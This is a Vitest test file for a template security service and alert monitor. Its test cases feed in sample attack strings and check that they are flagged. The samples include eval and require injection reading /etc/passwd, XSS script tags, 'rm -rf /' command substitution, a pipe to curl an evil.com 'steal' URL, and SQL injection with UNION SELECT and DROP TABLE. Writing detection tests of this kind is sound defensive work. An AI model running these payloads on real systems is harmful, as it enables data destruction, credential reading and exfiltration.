import { describe, it, expect, beforeEach, vi } from 'vitest';
import { TemplateSecurityService, SecurityViolationType } from '../services/template-security.js';
import { TemplateSecurityMonitor, SecurityAlertType } from '../services/template-security-monitor.js';

describe('TemplateSecurityService', () => {
  let securityService: TemplateSecurityService;

  beforeEach(() => {
    securityService = new TemplateSecurityService();
  });

  describe('Code Injection Detection', () => {
    it('should detect JavaScript eval injection', async () => {
      const maliciousTemplate = 'Hello {{name}}, eval("malicious code")';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations).toHaveLength(1);
      expect(result.violations[0].type).toBe(SecurityViolationType.CODE_INJECTION);
      expect(result.violations[0].severity).toBe('CRITICAL');
    });

    it('should detect Function constructor injection', async () => {
      const maliciousTemplate = 'Hello {{name}}, Function("return process")()';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.CODE_INJECTION)).toBe(true);
    });

    it('should detect Node.js require injection', async () => {
      const maliciousTemplate = 'Hello {{name}}, require("fs").readFileSync("/etc/passwd")';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.CODE_INJECTION)).toBe(true);
    });

    it('should detect process object access', async () => {
      const maliciousTemplate = 'Hello {{name}}, process.env.SECRET_KEY';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.CODE_INJECTION)).toBe(true);
    });
  });

  describe('Script Injection Detection', () => {
    it('should detect HTML script tags', async () => {
      const maliciousTemplate = 'Hello {{name}}, <script>alert("xss")</script>';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.SCRIPT_INJECTION)).toBe(true);
    });

    it('should detect JavaScript protocol', async () => {
      const maliciousTemplate = 'Click <a href="javascript:alert(1)">here</a>';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.SCRIPT_INJECTION)).toBe(true);
    });

    it('should detect HTML event handlers', async () => {
      const maliciousTemplate = 'Hello <div onclick="alert(1)">{{name}}</div>';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.SCRIPT_INJECTION)).toBe(true);
    });
  });

  describe('Command Injection Detection', () => {
    it('should detect command substitution', async () => {
      const maliciousTemplate = 'Hello {{name}}, $(rm -rf /)';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.COMMAND_INJECTION)).toBe(true);
    });

    it('should detect dangerous system commands', async () => {
      const maliciousTemplate = 'Hello {{name}}; rm -rf /important/data';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.COMMAND_INJECTION)).toBe(true);
    });

    it('should detect network commands in pipes', async () => {
      const maliciousTemplate = 'Hello {{name}} | curl http://evil.com/steal';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.COMMAND_INJECTION)).toBe(true);
    });
  });

  describe('SQL Injection Detection', () => {
    it('should detect SQL injection patterns', async () => {
      const maliciousTemplate = "Hello {{name}} WHERE id = '1' OR '1'='1'";
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.SQL_INJECTION)).toBe(true);
    });

    it('should detect UNION SELECT injection', async () => {
      const maliciousTemplate = 'Hello {{name}} UNION SELECT password FROM users';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.SQL_INJECTION)).toBe(true);
    });

    it('should detect DROP TABLE commands', async () => {
      const maliciousTemplate = 'Hello {{name}}; DROP TABLE users;';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.SQL_INJECTION)).toBe(true);
    });
  });

  describe('Template Injection Detection', () => {
    it('should detect config access attempts', async () => {
      const maliciousTemplate = 'Hello {{name}}, config: {{config}}';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.TEMPLATE_INJECTION)).toBe(true);
    });

    it('should detect request object access', async () => {
      const maliciousTemplate = 'Hello {{name}}, request: {{request}}';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.TEMPLATE_INJECTION)).toBe(true);
    });
  });

  describe('Sensitive Data Detection', () => {
    it('should detect hardcoded passwords', async () => {
      const maliciousTemplate = 'Hello {{name}}, password: "secret123"';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.SENSITIVE_DATA_EXPOSURE)).toBe(true);
    });

    it('should detect API keys', async () => {
      const maliciousTemplate = 'Hello {{name}}, api_key: "sk-1234567890abcdef"';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.SENSITIVE_DATA_EXPOSURE)).toBe(true);
    });

    it('should detect credit card patterns', async () => {
      const maliciousTemplate = 'Hello {{name}}, card: 4111-1111-1111-1111';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.SENSITIVE_DATA_EXPOSURE)).toBe(true);
    });

    it('should detect SSN patterns', async () => {
      const maliciousTemplate = 'Hello {{name}}, SSN: 123-45-6789';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.SENSITIVE_DATA_EXPOSURE)).toBe(true);
    });
  });

  describe('Variable Security Validation', () => {
    it('should detect dangerous variable names', async () => {
      const variables = [
        { name: 'constructor', type: 'string', required: true },
        { name: '__proto__', type: 'string', required: false }
      ];
      
      const result = await securityService.validateTemplateContent('Hello {{constructor}} {{__proto__}}', variables);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.UNSAFE_VARIABLE)).toBe(true);
    });

    it('should detect excessive variable count', async () => {
      const variables = Array.from({ length: 150 }, (_, i) => ({
        name: `var${i}`,
        type: 'string',
        required: false
      }));
      
      const result = await securityService.validateTemplateContent('Hello {{var1}}', variables);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.EXCESSIVE_COMPLEXITY)).toBe(true);
    });
  });

  describe('Malicious Pattern Detection', () => {
    it('should detect directory traversal', async () => {
      const maliciousTemplate = 'Hello {{name}}, file: ../../../etc/passwd';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.MALICIOUS_PATTERN)).toBe(true);
    });

    it('should detect file protocol URLs', async () => {
      const maliciousTemplate = 'Hello {{name}}, file://etc/passwd';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.MALICIOUS_PATTERN)).toBe(true);
    });

    it('should detect base64 data URLs', async () => {
      const maliciousTemplate = 'Hello {{name}}, data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.MALICIOUS_PATTERN)).toBe(true);
    });
  });

  describe('Complexity Analysis', () => {
    it('should detect excessive template length', async () => {
      const longTemplate = 'Hello {{name}}, ' + 'x'.repeat(60000);
      const result = await securityService.validateTemplateContent(longTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.EXCESSIVE_COMPLEXITY)).toBe(true);
    });

    it('should detect excessive nesting depth', async () => {
      // Create template with 12 levels of nesting (exceeds limit of 10)
      const nestedTemplate = '{{{{{{{{{{{{{{{{{{{{{{{{name}}}}}}}}}}}}}}}}}}}}}}}}';
      const result = await securityService.validateTemplateContent(nestedTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === SecurityViolationType.EXCESSIVE_COMPLEXITY)).toBe(true);
    });

    it('should warn about high variable usage', async () => {
      const variableTemplate = Array.from({ length: 60 }, (_, i) => `{{var${i}}}`).join(' ');
      const result = await securityService.validateTemplateContent(variableTemplate);
      
      expect(result.warnings.some(w => w.type === 'HIGH_VARIABLE_USAGE')).toBe(true);
    });
  });

  describe('Content Sanitization', () => {
    it('should remove script tags', () => {
      const maliciousContent = 'Hello <script>alert("xss")</script> world';
      const sanitized = securityService.sanitizeTemplateContent(maliciousContent);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert("xss")');
    });

    it('should remove javascript protocols', () => {
      const maliciousContent = 'Click <a href="javascript:alert(1)">here</a>';
      const sanitized = securityService.sanitizeTemplateContent(maliciousContent);
      
      expect(sanitized).not.toContain('javascript:');
    });

    it('should remove event handlers', () => {
      const maliciousContent = '<div onclick="alert(1)">Click me</div>';
      const sanitized = securityService.sanitizeTemplateContent(maliciousContent);
      
      expect(sanitized).not.toContain('onclick=');
    });
  });

  describe('Risk Score Calculation', () => {
    it('should calculate high risk score for critical violations', async () => {
      const maliciousTemplate = 'eval("code") <script>alert(1)</script> password="secret"';
      const result = await securityService.validateTemplateContent(maliciousTemplate);
      
      expect(result.riskScore).toBeGreaterThan(50);
    });

    it('should calculate low risk score for safe templates', async () => {
      const safeTemplate = 'Hello {{name}}, welcome to our service!';
      const result = await securityService.validateTemplateContent(safeTemplate);
      
      expect(result.riskScore).toBeLessThan(10);
      expect(result.isSecure).toBe(true);
    });
  });
});

describe('TemplateSecurityMonitor', () => {
  let securityMonitor: TemplateSecurityMonitor;

  beforeEach(() => {
    securityMonitor = new TemplateSecurityMonitor();
  });

  describe('Security Violation Recording', () => {
    it('should record security violations', async () => {
      await securityMonitor.recordSecurityViolation(
        'user123',
        'template456',
        SecurityViolationType.CODE_INJECTION,
        'CRITICAL'
      );

      const alerts = securityMonitor.getActiveAlerts();
      expect(alerts).toHaveLength(1);
      expect(alerts[0].type).toBe(SecurityAlertType.TEMPLATE_INJECTION_ATTEMPT);
      expect(alerts[0].severity).toBe('CRITICAL');
    });

    it('should trigger alerts for repeated violations', async () => {
      // Record multiple violations for the same user
      for (let i = 0; i < 4; i++) {
        await securityMonitor.recordSecurityViolation(
          'user123',
          'template456',
          SecurityViolationType.SCRIPT_INJECTION,
          'HIGH'
        );
      }

      const alerts = securityMonitor.getActiveAlerts();
      expect(alerts.length).toBeGreaterThan(0);
      expect(alerts.some(a => a.type === SecurityAlertType.REPEATED_SECURITY_VIOLATIONS)).toBe(true);
    });
  });

  describe('Suspicious Usage Detection', () => {
    it('should record suspicious template usage', async () => {
      await securityMonitor.recordSuspiciousUsage(
        'user123',
        'template456',
        ['Script injection attempt', 'Unusual variable access'],
        { suspiciousVariable: '<script>alert(1)</script>' }
      );

      const alerts = securityMonitor.getActiveAlerts();
      expect(alerts).toHaveLength(1);
      expect(alerts[0].type).toBe(SecurityAlertType.SUSPICIOUS_TEMPLATE_USAGE);
    });
  });

  describe('Rate Limit Monitoring', () => {
    it('should record rate limit violations', async () => {
      await securityMonitor.recordRateLimitViolation(
        'user123',
        '/api/templates',
        15,
        60000
      );

      const alerts = securityMonitor.getActiveAlerts();
      expect(alerts).toHaveLength(1);
      expect(alerts[0].type).toBe(SecurityAlertType.RATE_LIMIT_EXCEEDED);
    });
  });

  describe('Alert Management', () => {
    it('should resolve alerts', async () => {
      await securityMonitor.recordSecurityViolation(
        'user123',
        'template456',
        SecurityViolationType.CODE_INJECTION,
        'CRITICAL'
      );

      const alerts = securityMonitor.getActiveAlerts();
      expect(alerts).toHaveLength(1);

      const resolved = await securityMonitor.resolveAlert(alerts[0].id, 'admin123');
      expect(resolved).toBe(true);

      const activeAlerts = securityMonitor.getActiveAlerts();
      expect(activeAlerts).toHaveLength(0);
    });

    it('should get user-specific alerts', async () => {
      // CRITICAL violations always create alerts
      await securityMonitor.recordSecurityViolation(
        'user123',
        'template456',
        SecurityViolationType.CODE_INJECTION,
        'CRITICAL'
      );

      // CRITICAL violations always create alerts
      await securityMonitor.recordSecurityViolation(
        'user456',
        'template789',
        SecurityViolationType.CODE_INJECTION,
        'CRITICAL'
      );

      const user123Alerts = securityMonitor.getUserAlerts('user123');
      const user456Alerts = securityMonitor.getUserAlerts('user456');

      expect(user123Alerts.length).toBeGreaterThan(0);
      expect(user456Alerts.length).toBeGreaterThan(0);
      expect(user123Alerts[0].userId).toBe('user123');
      expect(user456Alerts[0].userId).toBe('user456');
    });

    it('should get template-specific alerts', async () => {
      await securityMonitor.recordSecurityViolation(
        'user123',
        'template456',
        SecurityViolationType.CODE_INJECTION,
        'CRITICAL'
      );

      const templateAlerts = securityMonitor.getTemplateAlerts('template456');
      expect(templateAlerts).toHaveLength(1);
      expect(templateAlerts[0].templateId).toBe('template456');
    });
  });

  describe('Security Statistics', () => {
    it('should provide security statistics', async () => {
      await securityMonitor.recordSecurityViolation(
        'user123',
        'template456',
        SecurityViolationType.CODE_INJECTION,
        'CRITICAL'
      );

      await securityMonitor.recordSecurityViolation(
        'user456',
        'template789',
        SecurityViolationType.SCRIPT_INJECTION,
        'HIGH'
      );

      const stats = securityMonitor.getSecurityStatistics();
      
      expect(stats.totalAlerts).toBeGreaterThan(0);
      expect(stats.activeAlerts).toBeGreaterThan(0);
      expect(stats.alertsBySeverity).toBeDefined();
      expect(stats.alertsByType).toBeDefined();
      expect(stats.topViolatingUsers).toBeDefined();
      expect(stats.topViolatingTemplates).toBeDefined();
    });
  });
});